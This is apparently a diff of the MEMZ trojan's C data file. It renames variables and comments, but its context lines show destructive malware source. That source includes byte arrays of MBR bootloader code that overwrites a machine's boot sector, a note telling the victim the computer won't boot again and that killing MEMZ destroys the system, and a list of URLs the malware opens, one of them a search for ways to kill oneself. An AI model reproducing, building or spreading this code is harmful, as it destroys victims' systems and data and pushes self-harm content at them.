@@ -1,7 +1,7 @@
 #include "MEMZ.h"
 
 #ifdef DESTRUCTIVE
-// MBR Bootloader Code
+// BootCode Stage-1
 const unsigned char Code1[] = {
 	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
 	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,
@@ -30,7 +30,7 @@ const unsigned char Code1[] = {
 	0x05, 0x88, 0xEB, 0x89, 0xF2, 0x5E, 0xE9, 0xB3, 0xFF, 0xBE, 0x00, 0x40,
 	0xE9, 0xC1, 0xFF
 };
-
+// BootCode Stage-2
 const unsigned char Code2[] = {
 	0x55, 0xAA, 0x83, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x04, 0x00, 0x00,
 	0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x20, 0x00, 0x35, 0x0B, 0x83, 0xF1,
@@ -196,11 +196,11 @@ const unsigned char Code2[] = {
 	0x20, 0x65, 0x6E, 0x6A, 0x6F, 0x5F, 0xBC, 0x06, 0x8A, 0x4E, 0x79, 0x61,
 	0x6E, 0x20, 0x43, 0x61, 0x74, 0x2E, 0x2E, 0x2E
 };
-const size_t Code1Len = sizeof(Code1);
-const size_t Code2Len = sizeof(Code2);
+const size_t nCode1 = sizeof(Code1);
+const size_t nCode2 = sizeof(Code2);
 #endif
 
-// Informatin-Note for User
+// Note
 const wchar_t Note[] = {
 	L"YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\n"
 	L"Your computer won't boot up again,\r\n"
@@ -209,8 +209,9 @@ const wchar_t Note[] = {
 	L"Trying to kill MEMZ will cause your system to be\r\n"
 	L"destroyed instantly, so don't try it :D"
 };
-const size_t NoteLen = sizeof(Note);
+const size_t nNote = sizeof(Note);
 
+// Execute
 const wchar_t *Sites[] = {
 	L"http://google.co.ck/search?q=best+way+to+kill+yourself",
 	L"http://google.co.ck/search?q=how+2+remove+a+virus",
@@ -261,13 +262,13 @@ const wchar_t *Sites[] = {
 };
 const size_t nSites = sizeof(Sites) / sizeof(void *);
 
+// PlaySounds
 const wchar_t *Sounds[] = {
 	L"SystemHand",
 	L"SystemQuestion",
 	L"SystemExclamation"
 };
 const size_t nSounds = sizeof(Sounds) / sizeof(void *);
-
 
 // KillMessages
 const wchar_t *Msgs[] = {
